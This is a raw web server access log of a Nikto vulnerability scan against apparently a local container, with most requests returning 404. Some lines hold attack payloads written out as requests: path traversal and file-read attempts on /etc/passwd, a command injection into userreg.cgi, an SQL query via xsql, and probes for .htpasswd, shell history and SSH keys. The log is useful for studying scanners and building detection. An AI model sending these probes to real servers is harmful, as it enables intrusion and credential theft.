172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /tinymsg.php HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002615)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /tmp_view.php?file=/etc/passwd HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002616)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /topic/entete.php HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002617)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /topsitesdir/edit.php HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002618)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /ttforum/index.php HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002619)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /tutos/file/file_new.php HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002620)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /tutos/file/file_select.php HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002621)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /typo3/typo3/dev/translations.php HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002622)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /uifc/MultFileUploadHandler.php+ HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002623)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /url.jsp HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002624)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /useraction.php3 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002625)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /userreg.cgi?cmd=insert&amp;lang=eng&amp;tnum=3&amp;fld1=test999%0acat&lt;/var/spool/mail/login&gt;&gt;/etc/passwd HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002626)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /utils/sprc.asp+ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002627)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /vars.inc+ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002628)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /VBZooM/add-subject.php HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002629)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /wbboard/profile.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002630)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /wbboard/reply.php HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002631)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webcalendar/login.php HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002632)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webcalendar/view_m.php HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002633)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webmail/lib/emailreader_execute_on_each_page.inc.php HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002634)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webmail/src/read_body.php HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002635)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /web_app/WEB-INF/webapp.properties HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002636)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /XMBforum/buddy.php HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002637)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /XMBforum/member.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002638)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /x_stat_admin.php HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002639)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /yabbse/Reminder.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002640)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /yabbse/Sources/Packages.php HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002641)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /zentrack/index.php HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002642)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_head.php HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002643)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /ows-bin/oaskill.exe?abcde.exe HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002717)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /ows-bin/oasnetconf.exe?-l%20-s%20BlahBlah HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002718)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /oem_webstage/oem.conf HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002726)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /database/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002727)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /demo/sql/index.jsp HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002728)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.wwwacl HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002735)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.www_acl HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002736)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.htpasswd HTTP/1.1" 403 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002739)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.access HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002740)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.addressbook HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002741)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.bashrc HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002742)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.bash_history HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002743)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.forward HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002744)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.history HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002745)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.htaccess HTTP/1.1" 403 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002746)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.lynx_cookies HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002747)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.mysql_history HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002748)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.passwd HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002749)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.pinerc HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002750)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.plan HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002751)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.proclog HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002752)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.procmailrc HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002753)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.profile HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002754)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.rhosts HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002755)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.sh_history HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002756)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.ssh HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002757)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.ssh/authorized_keys HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002758)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.ssh/known_hosts HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002759)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET ////../../data/config/microsrv.cfg HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002761)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET ////////../../../../../../etc/passwd HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002762)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_bin/shtml.exe/_vti_rpc HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002763)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/rt/overview-summary.html HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002764)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /docs/sdb/en/html/index.html HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002765)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /jservdocs/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002766)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/buffer1.jsp HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002767)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/buffer2.jsp HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002768)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/buffer3.jsp HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002769)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/buffer4.jsp HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002770)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/declaration/IntegerOverflow.jsp HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002771)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/extends1.jsp HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002772)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/extends2.jsp HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002773)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/Language.jsp HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002774)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/pageAutoFlush.jsp HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002775)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/pageDouble.jsp HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002776)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/pageExtends.jsp HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002777)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/pageImport2.jsp HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002778)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/pageInfo.jsp HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002779)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/pageInvalid.jsp HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002780)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/pageIsErrorPage.jsp HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002781)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/pageIsThreadSafe.jsp HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002782)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/jsp/pageSession.jsp HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002783)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/realPath.jsp HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002784)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /tomcat-docs/index.html HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002785)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /akopia/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002787)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bc4j.html HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002788)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /dms0 HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002789)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /jspdocs/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002790)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /mod_ose_docs HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002791)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /ojspdemos/basic/hellouser/hellouser.jsp HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002792)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /ojspdemos/basic/simple/usebean.jsp HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002793)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /ojspdemos/basic/simple/welcomeuser.jsp HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002794)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /oprocmgr-status HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002795)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /php/index.php HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002796)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal30/admin_/ HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002797)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/simpledad/admin_/ HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002798)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/simpledad/admin_/gateway.htm?schema=sample HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002799)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/simpledad/admin_/globalsettings.htm HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002800)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /search/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002801)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/Counter HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002802)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/DateServlet HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002803)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/FingerServlet HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002804)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/HelloWorldServlet HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002805)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/IsItWorking HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002806)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/SessionServlet HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002807)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/SimpleServlet HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002808)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/SnoopServlet HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002809)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /xdk/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002810)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /xsql/demo/adhocsql/query.xsql?sql=select%20username%20from%20ALL_USERS HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002811)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /admcgi/contents.htm HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002812)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /admcgi/scripts/Fpadmcgi.exe HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002813)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /admisapi/fpadmin.htm HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002814)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bin/admin.pl HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002815)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bin/cfgwiz.exe HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002816)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bin/CGImail.exe HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002817)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bin/contents.htm HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002818)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bin/fpadmin.htm HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002819)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bin/fpremadm.exe HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002820)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bin/fpsrvadm.exe HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002821)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cgi-bin/admin.pl HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002822)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cgi-bin/cfgwiz.exe HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002823)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cgi-bin/CGImail.exe HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002824)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cgi-bin/contents.htm HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002825)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cgi-bin/fpadmin.htm HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002826)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cgi-bin/fpremadm.exe HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002827)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cgi-bin/fpsrvadm.exe HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002828)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/admin.pl HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002829)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/cfgwiz.exe HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002830)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/CGImail.exe HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002831)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/contents.htm HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002832)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/fpadmin.htm HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002833)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/fpcount.exe HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002834)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/fpremadm.exe HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002835)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/fpsrvadm.exe HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002836)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_private/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002837)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_private/orders.htm HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002838)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_private/orders.txt HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002839)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_private/register.htm HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002840)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_private/register.txt HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002841)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_private/registrations.htm HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002842)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_private/registrations.txt HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002843)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_private/_vti_cnf/ HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002844)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_bin/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002845)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_bin/admin.pl HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002846)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_bin/cfgwiz.exe HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002847)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_bin/CGImail.exe HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002848)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_bin/contents.htm HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002849)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_bin/fpadmin.htm HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002850)"
